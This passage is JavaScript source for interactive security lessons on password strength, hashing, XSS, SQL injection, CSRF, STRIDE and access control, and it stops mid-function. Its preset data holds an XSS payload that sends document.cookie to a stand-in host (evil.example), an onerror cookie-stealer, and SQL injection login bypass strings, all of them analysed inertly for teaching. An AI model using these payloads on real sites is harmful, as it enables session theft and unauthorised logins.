// Computer security blocks. Every attack runs against a toy inside this
// page: no input is ever executed, sent anywhere, or inserted as HTML. The
// "vulnerable" paths are analysed and drawn, never run.

import { scrubAll } from "./scrub.js";
import { el, text } from "./plot.js";

const outs = (root) => Object.fromEntries([...root.querySelectorAll("[data-out]")].map((n) => [n.dataset.out, n]));
const $in = (root, name) => root.querySelector(`[data-in="${name}"]`);
const make = (tag, cls, txt) => {
  const e = document.createElement(tag);
  if (cls) e.className = cls;
  if (txt !== undefined) e.textContent = txt;
  return e;
};
const hex = (buf) => [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, "0")).join("");
const enc = new TextEncoder();
const subtle = globalThis.crypto?.subtle;
const sha256 = async (bytes) => hex(await subtle.digest("SHA-256", bytes));
const concat = (a, b) => { const o = new Uint8Array(a.length + b.length); o.set(a); o.set(b, a.length); return o; };
const fmtInt = (n) => Math.round(n).toLocaleString("en-US");

// A verdict line: ok (green), bad (red) or neutral.
function verdict(node, kind, msg) {
  node.textContent = msg;
  node.className = "min-h-5 text-sm " + (kind === "bad" ? "text-del" : kind === "ok" ? "text-add" : "text-muted-foreground");
}

// ============================================================ Password strength

const WORDS = ("password summer winter spring autumn love dragon monkey qwerty letmein admin welcome football baseball " +
  "sunshine princess master shadow superman iloveyou hello secret freedom whatever trustno1 starwars computer " +
  "michael jordan charlie pepper ginger cookie flower orange purple banana chocolate hunter killer soccer hockey " +
  "batman thomas tigger buster daniel andrew joshua jessica ashley matrix silver golden diamond paris london berlin " +
  "summertime family friend happy angel heaven forever").split(" ");
const LEET = { 0: "o", 1: "i", 3: "e", 4: "a", 5: "s", 7: "t", "@": "a", $: "s", "!": "i" };
const ROWS = ["qwertyuiop", "asdfghjkl", "zxcvbnm", "abcdefghijklmnopqrstuvwxyz", "0123456789"];
const classPool = (c) => (/[a-z]/.test(c) ? 26 : /[A-Z]/.test(c) ? 26 : /[0-9]/.test(c) ? 10 : 32);

function charsetSize(pw) {
  let n = 0;
  if (/[a-z]/.test(pw)) n += 26;
  if (/[A-Z]/.test(pw)) n += 26;
  if (/[0-9]/.test(pw)) n += 10;
  if (/[^a-zA-Z0-9 ]/.test(pw)) n += 32; // ASCII punctuation: 94 printable in all
  if (/ /.test(pw)) n += 1;
  return n;
}

// Segment the password into the cheapest sequence of guessable patterns
// (dictionary word, year, sequence, repeat, or a brute-forced character):
// dynamic programming over positions, minimising total bits.
function patternBits(pw) {
  const n = pw.length;
  const best = Array(n + 1).fill(Infinity);
  const how = Array(n + 1).fill(null);
  best[0] = 0;
  const unleet = (s) => [...s.toLowerCase()].map((c) => LEET[c] ?? c).join("");
  for (let i = 0; i < n; i++) {
    if (best[i] === Infinity) continue;
    const take = (j, bits, kind, label) => {
      if (best[i] + bits < best[j]) { best[j] = best[i] + bits; how[j] = { i, kind, label: label ?? pw.slice(i, j), bits }; }
    };
    take(i + 1, Math.log2(classPool(pw[i])), "brute");
    for (let j = i + 3; j <= n; j++) {
      const s = pw.slice(i, j);
      const u = unleet(s);
      const rank = WORDS.indexOf(u);
      if (rank >= 0) {
        let bits = Math.log2(rank + 2);
        if (/[A-Z]/.test(s)) bits += s === s[0].toUpperCase() + s.slice(1).toLowerCase() ? 1 : 2;
        if (u !== s.toLowerCase()) bits += 1; // l33t substitutions
        take(j, bits, "word", s);
      }
      if (j - i === 4 && /^(19|20)\d\d$/.test(s) && +s <= 2039) take(j, Math.log2(140), "year");
      if (ROWS.some((r) => r.includes(s.toLowerCase()) || [...r].reverse().join("").includes(s.toLowerCase()))) take(j, Math.log2(26 * 2) + Math.log2(j - i), "sequence");
      if (new Set(s).size === 1) take(j, Math.log2(classPool(s[0])) + Math.log2(j - i), "repeat");
    }
  }
  const segs = [];
  for (let j = n; j > 0; j = how[j].i) segs.unshift(how[j]);
  // Merge consecutive brute-force characters into one chip.
  const merged = [];
  for (const s of segs) {
    const last = merged.at(-1);
    if (last && last.kind === "brute" && s.kind === "brute") { last.label += s.label; last.bits += s.bits; }
    else merged.push({ ...s });
  }
  return { bits: best[n] + (merged.length > 1 ? Math.log2(merged.length) : 0), segs: merged };
}

function duration(guesses, perSecond) {
  const s = guesses / perSecond;
  if (s < 1) return "instant";
  const units = [["year", 31557600], ["day", 86400], ["hour", 3600], ["minute", 60], ["second", 1]];
  for (const [u, k] of units) {
    if (s >= k) {
      const v = s / k;
      if (u === "year" && v >= 1e6) return `${v.toExponential(1).replace("e+", " × 10^")} years`;
      return `${v >= 100 ? fmtInt(v) : v.toFixed(1)} ${u}${v >= 2 ? "s" : ""}`;
    }
  }
  return "instant";
}

// A 128-word list: 7 bits per word. (The EFF long list has 7,776 words,
// ≈ 12.9 bits each.)
const PHRASE = ("acorn anchor apple arrow atlas badge bamboo basket beacon berry blanket bottle breeze bridge bucket " +
  "cabin cactus camera candle canyon carpet castle cedar chalk cherry cliff clock cloud cobalt comet copper coral " +
  "cotton crane crystal daisy delta desert dinner dolphin dragonfly drum eagle echo ember engine falcon feather " +
  "fern fiddle flame forest fossil fountain garden garlic geyser glacier globe granite gravel harbor harvest " +
  "hazel helmet honey island ivory jacket jasmine jungle kettle kiwi ladder lagoon lantern lemon lily magnet " +
  "maple marble meadow meteor mint mirror moss mountain needle nest oasis ocean olive orbit otter paddle pebble " +
  "pepper piano pillow pine planet pocket pond prairie quartz quill rabbit radar raven reef ribbon river rocket " +
  "saddle salmon sapphire shell signal silk spruce summit thunder tulip").split(" ").slice(0, 128);

for (const root of document.querySelectorAll("[data-sec-entropy]")) {
  const pwIn = $in(root, "pw");
  const svg = root.querySelector("[data-plot]");
  const chips = root.querySelector("[data-chips]");
  const o = outs(root);
  const s = scrubAll(root, phrase);

  function draw() {
    const pw = pwIn.value;
    const pool = charsetSize(pw);
    const naive = pw.length ? pw.length * Math.log2(pool) : 0;
    const { bits, segs } = pw.length ? patternBits(pw) : { bits: 0, segs: [] };
    const real = Math.min(naive, bits);
    o.len.textContent = String([...pw].length);
    o.charset.textContent = pool ? `${pool} symbols` : "—";
    o.naive.textContent = `${naive.toFixed(1)} bits`;
    o.real.textContent = `${real.toFixed(1)} bits`;
    const guesses = 2 ** Math.max(0, real - 1); // on average, half the space
    o.offline.textContent = duration(guesses, 1e10);
    o.online.textContent = duration(guesses, 100 / 3600);

    chips.replaceChildren(...segs.map((sg) => {
      const c = make("span", "flex items-center gap-1 rounded-full border px-2 py-0.5 font-mono text-[11px] " + (sg.kind === "brute" ? "text-muted-foreground" : "border-del/40 bg-del/8 text-del"));
      c.append(make("span", "", sg.label), make("span", "font-sans opacity-70", `${sg.kind} · ${sg.bits.toFixed(1)} b`));
      return c;
    }));

    svg.replaceChildren();
    const max = Math.max(100, naive, real) * 1.05;
    const sx = (b) => 110 + (b / max) * 430;
    for (const [b, lbl] of [[40, "40"], [60, "60"], [80, "80 bits"]]) {
      el("line", { x1: sx(b), x2: sx(b), y1: 14, y2: 150, style: "stroke:currentColor;stroke-opacity:0.12;stroke-dasharray:3 3" }, svg);
      text(svg, sx(b), 166, lbl, { "text-anchor": "middle" });
    }
    const bar = (y, v, label, color) => {
      text(svg, 100, y + 17, label, { "text-anchor": "end", class: "fill-foreground text-[12px]" });
      el("rect", { x: 110, y, width: Math.max(1, sx(v) - 110), height: 26, rx: 4, style: `fill:${color};fill-opacity:0.75` }, svg);
      text(svg, sx(v) + 6, y + 17, `${v.toFixed(1)} bits`, { class: "fill-foreground font-mono text-[11px]" });
    };
    bar(30, naive, "naive", "var(--vec-u)");
    bar(90, real, "pattern-aware", real < 40 ? "var(--code-del)" : real < 60 ? "var(--vec-out)" : "var(--code-add)");
    text(svg, 110, 184, "≈ 40 bits: minutes offline · 60: years for one GPU · 80+: out of reach for fast hashes", { class: "fill-muted-foreground text-[10px]" });
  }

  function phrase() {
    const n = Math.round(s.words.get());
    const r = new Uint32Array(n);
    crypto.getRandomValues(r);
    const words = [...r].map((x) => PHRASE[x & 127]); // 128 | 2³², so unbiased
    o.phrase.textContent = words.join("-");
    o["phrase-bits"].textContent = `${n} words × 7 bits = ${n * 7} bits from this 128-word list; with the EFF list (7,776 words) it would be ${(n * Math.log2(7776)).toFixed(1)} bits.`;
  }

  pwIn.addEventListener("input", draw);
  root.querySelector("[data-action=phrase]").addEventListener("click", phrase);
  draw();
  phrase();
}

// ============================================================ Password storage

const COMMON = ["123456", "password", "123456789", "12345678", "qwerty", "abc123", "password123", "111111", "letmein", "dragon",
  "monkey", "iloveyou", "sunshine", "princess", "football", "admin", "welcome", "shadow", "master", "superman"];

for (const root of document.querySelectorAll("[data-sec-storage]")) {
  const pwIn = $in(root, "pw");
  const o = outs(root);
  const leak = root.querySelector("[data-leak]");
  if (!subtle) { verdict(o.crack, "bad", "Web Crypto is unavailable here (it needs a secure context)."); continue; }
  const s = scrubAll(root, () => pbkdf2());
  const table = new Map();
  let salt = crypto.getRandomValues(new Uint8Array(16));
  let rows = [];

  async function pbkdf2() {
    const key = await subtle.importKey("raw", enc.encode(pwIn.value), "PBKDF2", false, ["deriveBits"]);
    const iterations = Math.round(s.iter.get()) * 1000;
    const t0 = performance.now();
    const bits = await subtle.deriveBits({ name: "PBKDF2", hash: "SHA-256", salt, iterations }, key, 256);
    const ms = performance.now() - t0;
    o.pbkdf2.textContent = `${fmtInt(iterations)} iterations → ${hex(bits)}`;
    o.time.textContent = `${ms.toFixed(0)} ms here → about ${fmtInt(1000 / Math.max(ms, 0.01))} guesses per second per core, instead of billions`;
    return hex(bits);
  }

  async function update() {
    const pw = pwIn.value;
    o.plain.textContent = pw || "—";
    o.sha.textContent = await sha256(enc.encode(pw));
    o.salt.textContent = hex(salt);
    o.salted.textContent = await sha256(concat(salt, enc.encode(pw)));
    await pbkdf2();
  }

  async function buildLeak() {
    for (const p of COMMON) table.set(await sha256(enc.encode(p)), p);
    const s1 = crypto.getRandomValues(new Uint8Array(16));
    rows = [
      { user: "alice", scheme: "SHA-256", stored: await sha256(enc.encode("password123")) },
      { user: "bob", scheme: "SHA-256", stored: await sha256(enc.encode("dragon")) },
      { user: "carol", scheme: "salted SHA-256", stored: await sha256(concat(s1, enc.encode("letmein"))) },
      { user: "you", scheme: "SHA-256", stored: "" },
    ];
    renderLeak();
  }

  function renderLeak(result) {
    leak.replaceChildren(...rows.map((r, i) => {
      const line = make("div", "flex flex-col gap-0.5 rounded-md border bg-code p-2");
      const top = make("div", "flex items-center justify-between gap-2 text-xs");
      top.append(make("span", "font-medium", `${r.user} · ${r.scheme}`));
      if (result) {
        const hit = result[i];
        top.append(make("span", hit ? "font-mono text-del" : "font-mono text-add", hit ? `cracked: "${hit}"` : "not in table"));
      }
      line.append(top, make("span", "font-mono text-[11px] break-all text-muted-foreground", r.stored.slice(0, 32) + "…"));
      return line;
    }));
  }

  root.querySelector("[data-action=crack]").addEventListener("click", async () => {
    rows[3].stored = await sha256(enc.encode(pwIn.value));
    const result = rows.map((r) => (r.scheme === "SHA-256" ? table.get(r.stored) ?? null : null));
    renderLeak(result);
    const n = result.filter(Boolean).length;
    verdict(o.crack, n ? "bad" : "ok", `${n} of ${rows.length} recovered by lookup alone. The salted row survives: the table would have to be rebuilt for its salt, and PBKDF2 makes every rebuild slow.`);
  });

  let timer = 0;
  pwIn.addEventListener("input", () => { clearTimeout(timer); timer = setTimeout(update, 250); });
  update();
  buildLeak();
}

// ============================================================ XSS

const XSS = {
  img: 'Nice post! <img src=x onerror="steal(document.cookie)">',
  script: "<script>fetch('https://evil.example/?c=' + document.cookie)</script>",
  link: '<a href="javascript:steal(document.cookie)">click for a prize</a>',
  plain: "Great article, thanks!",
};

for (const root of document.querySelectorAll("[data-sec-xss]")) {
  const cIn = $in(root, "comment");
  const tree = root.querySelector("[data-tree]");
  const safe = root.querySelector("[data-safe]");
  const escaped = root.querySelector("[data-escaped]");
  const o = outs(root);

  function analyse() {
    const src = cIn.value;
    // DOMParser builds an inert document: scripts never run and nothing
    // loads. We only walk it to describe what innerHTML would create.
    const doc = new DOMParser().parseFromString(`<!doctype html><body>${src}`, "text/html");
    const findings = [];
    tree.replaceChildren();
    const walk = (node, depth) => {
      for (const n of node.childNodes) {
        const line = make("div", "whitespace-pre");
        line.style.paddingLeft = `${depth * 14}px`;
        if (n.nodeType === Node.TEXT_NODE) {
          if (!n.textContent.trim()) continue;
          line.append(make("span", "text-muted-foreground", `"${n.textContent}"`));
        } else if (n.nodeType === Node.ELEMENT_NODE) {
          const tag = n.tagName.toLowerCase();
          line.append(make("span", tag === "script" ? "text-del" : "tok-keyword", `<${tag}`));
          for (const a of n.attributes) {
            const danger = /^on/i.test(a.name) || (/^(href|src|action|formaction)$/i.test(a.name) && /^\s*javascript:/i.test(a.value));
            line.append(make("span", danger ? "rounded bg-del/15 px-0.5 text-del" : "text-muted-foreground", ` ${a.name}="${a.value}"`));
            if (/^on/i.test(a.name)) findings.push(`${a.name} handler on <${tag}> would run "${a.value}"${tag === "img" ? " as soon as the broken image fails to load" : ""}.`);
            else if (danger) findings.push(`${a.name}="javascript:…" on <${tag}> would run when clicked.`);
          }
          line.append(make("span", "tok-keyword", ">"));
          if (tag === "script") findings.push("A <script> inserted with innerHTML does not run (HTML spec), but the same text in server-rendered HTML would; never rely on that.");
          tree.append(line);
          walk(n, depth + 1);
          continue;
        }
        tree.append(line);
      }
    };
    walk(doc.body, 0);
    if (!tree.childElementCount) tree.append(make("span", "text-muted-foreground", "(empty)"));
    verdict(o.bad, findings.length ? "bad" : "ok", findings.length ? findings.join(" ") : "No active content in this comment.");
    safe.textContent = src;
    escaped.textContent = src.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]);
  }

  cIn.addEventListener("input", analyse);
  root.querySelectorAll("[data-preset]").forEach((b) => b.addEventListener("click", () => { cIn.value = XSS[b.dataset.preset]; analyse(); }));
  analyse();
}

// ============================================================ SQL injection

const USERS = [
  { name: "alice", password: "wonderland", role: "user" },
  { name: "admin", password: "S3cure!pass", role: "admin" },
  { name: "bob", password: "builder", role: "user" },
];
const SQLI = { comment: ["admin' --", "anything"], or: ["' OR '1'='1", "' OR '1'='1"], honest: ["alice", "wonderland"] };

// A tiny SQL WHERE-clause tokenizer and parser: identifiers, '…' strings
// (with '' escapes), numbers, = AND OR ( ) and -- comments.
function sqlTokens(s) {
  const out = [];
  let i = 0;
  while (i < s.length) {
    const c = s[i];
    if (/\s/.test(c)) { i++; continue; }
    if (s.startsWith("--", i)) { out.push({ t: "comment", v: s.slice(i) }); break; }
    if (c === "'") {
      let j = i + 1, v = "";
      for (;;) {
        if (j >= s.length) throw new Error("unterminated string literal");
        if (s[j] === "'" && s[j + 1] === "'") { v += "'"; j += 2; continue; }
        if (s[j] === "'") break;
        v += s[j++];
      }
      out.push({ t: "str", v });
      i = j + 1;
      continue;
    }
    if (/[0-9]/.test(c)) { let j = i; while (/[0-9]/.test(s[j] ?? "")) j++; out.push({ t: "num", v: s.slice(i, j) }); i = j; continue; }
    if (/[A-Za-z_*]/.test(c)) {
      let j = i; while (/[A-Za-z_0-9*]/.test(s[j] ?? "")) j++;
      const w = s.slice(i, j);
      out.push(/^(and|or|select|from|where)$/i.test(w) ? { t: "kw", v: w.toUpperCase() } : { t: "id", v: w });
      i = j; continue;
    }
    if ("=()".includes(c)) { out.push({ t: c }); i++; continue; }
    throw new Error(`unexpected "${c}"`);
  }
  return out;
}

function sqlParseWhere(tokens) {
  let p = tokens.findIndex((t) => t.t === "kw" && t.v === "WHERE") + 1;
  const peek = () => tokens[p];
  const operand = () => {
    const t = tokens[p++];
    if (!t || t.t === "comment") throw new Error("expected a value");
    if (t.t === "(") { const e = orExpr(); if (tokens[p++]?.t !== ")") throw new Error("missing )"); return e; }
    if (t.t === "id") return { op: "col", v: t.v };
    if (t.t === "str" || t.t === "num") return { op: "lit", v: t.v };
    if (t.t === "param") return { op: "param", v: t.v, i: t.i };
    throw new Error(`unexpected ${t.v ?? t.t}`);
  };
  const cmp = () => {
    const a = operand();
    if (peek()?.t === "=") { p++; return { op: "=", a, b: operand() }; }
    return a;
  };
  const andExpr = () => { let e = cmp(); while (peek()?.t === "kw" && peek().v === "AND") { p++; e = { op: "AND", a: e, b: cmp() }; } return e; };
  const orExpr = () => { let e = andExpr(); while (peek()?.t === "kw" && peek().v === "OR") { p++; e = { op: "OR", a: e, b: andExpr() }; } return e; };
  const tree = orExpr();
  const rest = tokens.slice(p);
  if (rest.length && rest[0].t !== "comment") throw new Error(`unexpected ${rest[0].v ?? rest[0].t}`);
  return { tree, comment: rest[0]?.v };
}

function sqlEval(e, row) {
  switch (e.op) {
    case "col": return row[e.v];
    case "lit": case "param": return e.v;
    case "=": return String(sqlEval(e.a, row)) === String(sqlEval(e.b, row));
    case "AND": return Boolean(sqlEval(e.a, row)) && Boolean(sqlEval(e.b, row));
    case "OR": return Boolean(sqlEval(e.a, row)) || Boolean(sqlEval(e.b, row));
  }
}

function sqlTreeNodes(e, depth = 0) {
  const pad = (n) => { n.style.paddingLeft = `${depth * 16}px`; return n; };
  if (e.op === "AND" || e.op === "OR") return [pad(make("div", "tok-keyword", e.op)), ...sqlTreeNodes(e.a, depth + 1), ...sqlTreeNodes(e.b, depth + 1)];
  if (e.op === "=") {
    const line = pad(make("div", "whitespace-pre-wrap break-all"));
    const part = (x) => x.op === "col" ? make("span", "", x.v) : make("span", x.op === "param" ? "tok-string" : "tok-string", x.op === "param" ? `?${x.i} = '${x.v}'` : `'${x.v}'`);
    line.append(part(e.a), make("span", "tok-operator", " = "), part(e.b));
    return [line];
  }
  return [pad(make("div", "tok-string", e.op === "col" ? e.v : `'${e.v}'`))];
}

for (const root of document.querySelectorAll("[data-sec-sqli]")) {
  const uIn = $in(root, "user"), pIn = $in(root, "pass");
  const o = outs(root);
  const qBad = root.querySelector("[data-q-bad]"), treeBad = root.querySelector("[data-tree-bad]");
  const treeGood = root.querySelector("[data-tree-good]"), params = root.querySelector("[data-params]");
  const tbody = root.querySelector("[data-rows]");

  function run() {
    const u = uIn.value, p = pIn.value;
    const query = `SELECT * FROM users\nWHERE name = '${u}' AND password = '${p}'`;
    qBad.textContent = query;
    let badRows = [];
    treeBad.replaceChildren();
    try {
      const { tree, comment } = sqlParseWhere(sqlTokens(query));
      treeBad.append(...sqlTreeNodes(tree));
      if (comment) treeBad.append(make("div", "tok-comment", `ignored: ${comment}`));
      badRows = USERS.filter((r) => sqlEval(tree, r));
      const injected = /'/.test(u + p);
      verdict(o.bad, badRows.length && injected ? "bad" : badRows.length ? "ok" : "neutral",
        badRows.length ? `Logged in as ${badRows[0].name}${badRows.length > 1 ? ` (${badRows.length} rows matched)` : ""}${injected ? ": the quote ended the string and the rest became SQL." : "."}` : "No row matched.");
    } catch (err) {
      treeBad.append(make("div", "text-del", `syntax error: ${err.message}`));
      verdict(o.bad, "bad", "The query broke. Error messages like this one can also leak the query's structure to an attacker.");
    }
    // Parameterised: placeholders are parsed first; values are bound later,
    // so they can only ever be literals.
    const tokens = sqlTokens("SELECT * FROM users WHERE name = PARAM1 AND password = PARAM2")
      .map((t) => (t.t === "id" && /^PARAM\d$/.test(t.v) ? { t: "param", i: +t.v.slice(5), v: t.v === "PARAM1" ? u : p } : t));
    const { tree } = sqlParseWhere(tokens);
    treeGood.replaceChildren(...sqlTreeNodes(tree));
    params.replaceChildren(make("div", "", `?1 ← ${JSON.stringify(u)}`), make("div", "", `?2 ← ${JSON.stringify(p)}`));
    const goodRows = USERS.filter((r) => sqlEval(tree, r));
    verdict(o.good, goodRows.length ? "ok" : "neutral", goodRows.length ? `Logged in as ${goodRows[0].name}: the right password.` : "No row matched: the input stayed a plain string.");
    tbody.replaceChildren(...USERS.map((r) => {
      const tr = make("tr", "border-b last:border-b-0");
      const cell = (v, cls = "") => { const td = make("td", "py-1.5 pr-3 " + cls, v); tr.append(td); };
      cell(r.name); cell(r.password); cell(r.role);
      cell(badRows.includes(r) ? "match" : "·", badRows.includes(r) ? "text-del" : "text-muted-foreground");
      cell(goodRows.includes(r) ? "match" : "·", goodRows.includes(r) ? "text-add" : "text-muted-foreground");
      return tr;
    }));
  }

  [uIn, pIn].forEach((i) => i.addEventListener("input", run));
  root.querySelectorAll("[data-preset]").forEach((b) => b.addEventListener("click", () => { [uIn.value, pIn.value] = SQLI[b.dataset.preset]; run(); }));
  run();
}

// ============================================================ CSRF

const CSRF_SCENARIOS = {
  form: { method: "POST", what: "an invisible <form method=post action=https://bank.example/transfer> submitted by script", topLevel: true },
  img: { method: "GET", what: "<img src=https://bank.example/transfer?to=mallory&amount=500>", topLevel: false },
  fetch: { method: "POST", what: "fetch('https://bank.example/transfer', {method: 'POST', credentials: 'include'})", topLevel: false },
  nav: { method: "GET", what: "a link the victim clicks: <a href=https://bank.example/transfer?to=mallory&amount=500>", topLevel: true },
};

for (const root of document.querySelectorAll("[data-sec-csrf]")) {
  const steps = root.querySelector("[data-steps]");
  const result = root.querySelector("[data-result]");
  const state = { scenario: "form", samesite: "none", origin: false, token: false };

  root.addEventListener("seg-change", (e) => {
    const which = e.target.getAttribute("aria-label");
    if (which === "SameSite") state.samesite = e.detail.value;
    else state.scenario = e.detail.value;
    draw();
  });
  root.querySelectorAll("[data-toggle]").forEach((sw) => sw.addEventListener("shadcn:checked-change", (e) => { state[sw.dataset.toggle] = e.detail.checked; draw(); }));

  function draw() {
    const sc = CSRF_SCENARIOS[state.scenario];
    const cookie = state.samesite === "none" || (state.samesite === "lax" && sc.topLevel && sc.method === "GET");
    const list = [];
    let blocked = null;
    const add = (txt, kind = "neutral") => list.push([txt, kind]);
    add("You are logged in to bank.example in another tab; then you open evil.example.");
    add(`evil.example triggers ${sc.what}.`);
    if (cookie) add(`The browser attaches the session cookie (SameSite=${state.samesite === "none" ? "None" : "Lax allows top-level GET navigations"}).`, "bad");
    else { add(`The browser leaves the session cookie off: SameSite=${state.samesite === "lax" ? "Lax only allows top-level GET navigations" : "Strict never sends it cross-site"}.`, "ok"); blocked ??= "SameSite cookie"; }
    if (!blocked && state.origin) { add("The server sees Sec-Fetch-Site: cross-site (and a foreign Origin) on a state-changing endpoint and refuses.", "ok"); blocked = "origin check"; }
    else if (state.origin) add("The origin check would also refuse: Sec-Fetch-Site: cross-site.", "ok");
    if (!blocked && state.token) { add("No valid CSRF token: evil.example cannot read the bank's pages, so it cannot know the token. Refused.", "ok"); blocked = "CSRF token"; }
    else if (state.token) add("The token check would also refuse.", "ok");
    if (!blocked) add(state.scenario === "fetch" ? "The transfer runs. CORS hides the response from evil.example, but the side effect has already happened." : "The bank executes the transfer as you.", "bad");
    steps.replaceChildren(...list.map(([t, k], i) => {
      const li = make("li", "flex gap-2 rounded-md border px-2.5 py-1.5 text-sm " + (k === "bad" ? "border-del/40 bg-del/8" : k === "ok" ? "border-add/40 bg-add/8" : ""));
      li.append(make("span", "font-mono text-xs text-muted-foreground", String(i + 1)), make("span", "", t));
      return li;
    }));
    result.className = "rounded-lg border p-3 text-sm " + (blocked ? "border-add/40 bg-add/8" : "border-del/40 bg-del/8");
    result.textContent = blocked ? `Stopped by the ${blocked}.` : "Forged: €500 moved to mallory. Turn on a defence.";
  }
  draw();
}

// ============================================================ STRIDE

const STRIDE = [
  { k: "S", name: "Spoofing", threat: (c) => `Someone pretends to be the ${c}.`, fix: "Strong authentication: passwords + 2FA, mutual TLS or signed tokens for services." },
  { k: "T", name: "Tampering", threat: (c) => `Data in or handled by the ${c} is modified.`, fix: "Integrity: TLS in transit, signatures or MACs, input validation, least-privileged write access." },
  { k: "R", name: "Repudiation", threat: (c) => `Actions through the ${c} can be denied later.`, fix: "Tamper-evident audit logs with timestamps and actor IDs." },
  { k: "I", name: "Information disclosure", threat: (c) => `The ${c} leaks data it should keep private.`, fix: "Encryption at rest and in transit, access checks, no secrets in logs or errors." },
  { k: "D", name: "Denial of service", threat: (c) => `The ${c} is overwhelmed or made unavailable.`, fix: "Rate limits, quotas, timeouts, autoscaling, backpressure." },
  { k: "E", name: "Elevation of privilege", threat: (c) => `An attacker gains more rights through the ${c}.`, fix: "Authorization on every request, least privilege, sandboxing, patching." },
];
// STRIDE-per-element (Microsoft SDL): which categories apply to each kind.
const STRIDE_FOR = { external: "SR", process: "STRIDE", store: "TRID" };
const STRIDE_KIND = { browser: "external", web: "process", db: "store", pay: "external", admin: "process" };
const STRIDE_NAME = { browser: "Browser", web: "Web app", db: "Database", pay: "Payment API", admin: "Admin panel" };

for (const root of document.querySelectorAll("[data-sec-stride]")) {
  const list = root.querySelector("[data-threats]");
  const o = outs(root);
  const ticked = { web: new Set(["S", "T", "E"]), db: new Set(["I"]) };
  let current = "web";

  function select(key) {
    current = key;
    root.querySelectorAll("[data-comp]").forEach((g) => g.toggleAttribute("data-on", g.dataset.comp === key));
    o.comp.textContent = `${STRIDE_NAME[key]} · ${STRIDE_KIND[key]}`;
    const set = (ticked[key] ??= new Set());
    list.replaceChildren(...STRIDE.filter((s) => STRIDE_FOR[STRIDE_KIND[key]].includes(s.k)).map((s) => {
      const lab = make("label", "flex cursor-pointer gap-2.5 rounded-md border p-2.5 text-sm has-checked:border-brand/50 has-checked:bg-brand/5");
      const box = make("input", "mt-0.5 size-4 accent-[var(--brand)]");
      box.type = "checkbox";
      box.checked = set.has(s.k);
      box.addEventListener("change", () => { box.checked ? set.add(s.k) : set.delete(s.k); counts(); });
      const body = make("span", "flex flex-col gap-0.5");
      body.append(make("span", "font-medium", `${s.k} · ${s.name}`), make("span", "text-muted-foreground", s.threat(STRIDE_NAME[key])), make("span", "text-xs text-add", `Mitigation: ${s.fix}`));
      lab.append(box, body);
      return lab;
    }));
    counts();
  }

  function counts() {
    let total = 0;
    root.querySelectorAll("[data-count]").forEach((t) => {
      const n = ticked[t.dataset.count]?.size ?? 0;
      total += n;
      t.textContent = n ? `${n} threat${n > 1 ? "s" : ""}` : "";
    });
    o.total.textContent = `${total} threats ticked across the diagram. Only categories that apply to the element's kind are offered (STRIDE-per-element).`;
  }

  function markdown() {
    const lines = ["| Element | Threat | Mitigation |", "| --- | --- | --- |"];
    for (const [key, set] of Object.entries(ticked)) for (const s of STRIDE) if (set.has(s.k)) lines.push(`| ${STRIDE_NAME[key]} | ${s.name}: ${s.threat(STRIDE_NAME[key])} | ${s.fix} |`);
    return lines.join("\n");
  }

  root.querySelectorAll("[data-comp]").forEach((g) => {
    g.addEventListener("click", () => select(g.dataset.comp));
    g.addEventListener("keydown", (e) => { if (e.key === "Enter" || e.key === " ") { e.preventDefault(); select(g.dataset.comp); } });
  });
  const exp = root.querySelector("[data-action=export]");
  exp.addEventListener("click", () => navigator.clipboard?.writeText(markdown()).then(() => {
    exp.setAttribute("data-copied", "");
    setTimeout(() => exp.removeAttribute("data-copied"), 1400);
  }));
  select(current);
}

// ============================================================ Access control

const ACL_USERS = {
  "ana (editor, sales)": { name: "ana", role: "editor", dept: "sales" },
  "ben (viewer, sales)": { name: "ben", role: "viewer", dept: "sales" },
  "chloé (editor, legal)": { name: "chloé", role: "editor", dept: "legal" },
  "dev (admin, it)": { name: "dev", role: "admin", dept: "it" },
};
const ACL_DOCS = {
  "sales-report (sales, draft)": { name: "sales-report", dept: "sales", status: "draft" },
  "contract (legal, final)": { name: "contract", dept: "legal", status: "final" },
  "roadmap (it, draft)": { name: "roadmap", dept: "it", status: "draft" },
};
const ACTIONS = ["read", "edit", "delete", "share"];
const ABAC = [
  { effect: "deny", text: "deny if action = delete and doc.status = final", test: (u, a, d) => a === "delete" && d.status === "final" },
  { effect: "allow", text: "allow if user.role = admin", test: (u) => u.role === "admin" },
  { effect: "allow", text: "allow if action = read and user.dept = doc.dept", test: (u, a, d) => a === "read" && u.dept === d.dept },
  { effect: "allow", text: "allow if action ∈ {edit, share} and user.role = editor and user.dept = doc.dept and doc.status = draft and 08:00 ≤ hour < 20:00",
    test: (u, a, d, hr) => (a === "edit" || a === "share") && u.role === "editor" && u.dept === d.dept && d.status === "draft" && hr >= 8 && hr < 20 },
];

for (const root of document.querySelectorAll("[data-sec-access]")) {
  const matrix = { viewer: new Set(["read"]), editor: new Set(["read", "edit", "share"]), admin: new Set(ACTIONS) };
  const tbody = root.querySelector("[data-matrix]");
  const rules = root.querySelector("[data-rules]");
  const decision = root.querySelector("[data-decision]");
  let model = "rbac";

  tbody.replaceChildren(...Object.keys(matrix).map((role) => {
    const tr = make("tr", "border-b last:border-b-0");
    tr.append(make("td", "py-2 pr-3 font-medium", role));
    for (const a of ACTIONS) {
      const td = make("td", "px-2 py-2 text-center");
      const box = make("input", "size-4 accent-[var(--brand)]");
      box.type = "checkbox";
      box.checked = matrix[role].has(a);
      box.setAttribute("aria-label", `${role} may ${a}`);
      box.addEventListener("change", () => { box.checked ? matrix[role].add(a) : matrix[role].delete(a); decide(); });
      td.append(box);
      tr.append(td);
    }
    return tr;
  }));

  function decide() {
    const u = ACL_USERS[$in(root, "user").value], a = $in(root, "action").value, d = ACL_DOCS[$in(root, "doc").value];
    const hr = parseInt($in(root, "hour").value, 10);
    let ok, why;
    if (model === "rbac") {
      ok = matrix[u.role].has(a);
      why = `${u.role} ${ok ? "has" : "lacks"} "${a}" in the matrix. RBAC ignores the document: ${u.name} gets the same answer for every document${ok && u.dept !== d.dept ? `, even ${d.name} from ${d.dept}` : ""}.`;
    } else {
      const hits = ABAC.map((r) => r.test(u, a, d, hr));
      rules.replaceChildren(...ABAC.map((r, i) => {
        const li = make("li", "rounded-md border px-2.5 py-1.5 " + (hits[i] ? (r.effect === "deny" ? "border-del/50 bg-del/8" : "border-add/50 bg-add/8") : "text-muted-foreground"));
        li.textContent = `${i + 1}. ${r.text}${hits[i] ? "  ← matches" : ""}`;
        return li;
      }));
